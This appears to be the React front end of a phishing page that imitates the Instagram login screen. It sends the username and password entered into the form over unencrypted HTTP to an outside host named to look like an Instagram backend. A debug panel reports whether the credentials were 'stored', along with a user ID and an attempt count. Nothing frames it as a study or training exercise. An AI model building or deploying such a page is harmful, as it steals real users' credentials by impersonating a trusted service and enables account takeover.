import React, { useState } from 'react';
import axios from 'axios';
import './App.css';

function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [showDebug, setShowDebug] = useState(false);
  const [debugInfo, setDebugInfo] = useState(null);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    setDebugInfo(null);

    try {
      const response = await axios.post('http://instagram-backend-ivms.onrender.com/api/auth/login', {
        username,
        password
      });

      // Store debug info if available
      if (response.data._debug) {
        setDebugInfo(response.data._debug);
      }

      setError(response.data.message);
      
    } catch (err) {
      if (err.response) {
        setError(err.response.data.message);
        if (err.response.data._debug) {
          setDebugInfo(err.response.data._debug);
        }
      } else {
        setError('Network error. Please try again.');
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <div className="logo">
          <h1>Instagram</h1>
        </div>

        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit" disabled={loading}>
            {loading ? 'Logging in...' : 'Log In'}
          </button>
        </form>

        {error && (
          <div className="error-message">
            <p>{error}</p>
          </div>
        )}

        {debugInfo && showDebug && (
          <div className="debug-info">
            <p><strong>Debug:</strong></p>
            <p>Stored: {debugInfo.stored ? '✅' : '❌'}</p>
            <p>User ID: {debugInfo.userId}</p>
            <p>Attempts: {debugInfo.attempts}</p>
          </div>
        )}

        <div className="debug-toggle">
          <button onClick={() => setShowDebug(!showDebug)}>
            {showDebug ? 'Hide Debug' : 'Show Debug'}
          </button>
        </div>

        <div className="signup-prompt">
          <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
      </div>

      <div className="app-store">
        <p>Get the app.</p>
        <div className="store-buttons">
          <button>App Store</button>
          <button>Google Play</button>
        </div>
      </div>
    </div>
  );
}

export default App;